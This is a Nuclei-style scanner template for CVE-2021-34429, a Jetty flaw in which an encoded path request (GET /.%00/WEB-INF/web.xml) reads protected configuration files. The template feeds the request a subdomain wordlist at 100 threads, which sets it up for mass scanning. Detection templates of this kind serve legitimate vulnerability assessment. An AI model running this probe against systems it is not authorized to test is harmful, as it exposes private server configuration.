id: CVE-2021-34429 1
info:
  name: Jetty Authorization Before Parsing and Canonicalization Variation
  author: Bernardo Rodrigues @bernardofsr | Andr√© Monteiro @am0nt31r0
  severity: medium
  description: |
    For Eclipse Jetty versions 9.4.37-9.4.42, 10.0.1-10.0.5 & 11.0.1-11.0.5, URIs can be crafted using some encoded characters to access the content of the WEB-INF directory and/or bypass some security constraints. This is a variation of the vulnerability reported in CVE-2021-28164/GHSA-v7ff-8wcx-gmc5.
  reference: |
    - https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm
requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100
    raw:
      - |+
        GET /.%00/WEB-INF/web.xml HTTP/1.1
        Host: {{Subdomains}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
        Connection: close

    unsafe: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "</web-app>"
          - "java.sun.com"
        part: body
        condition: and
      - type: word
        part: header
        words:
          - "application/xml"
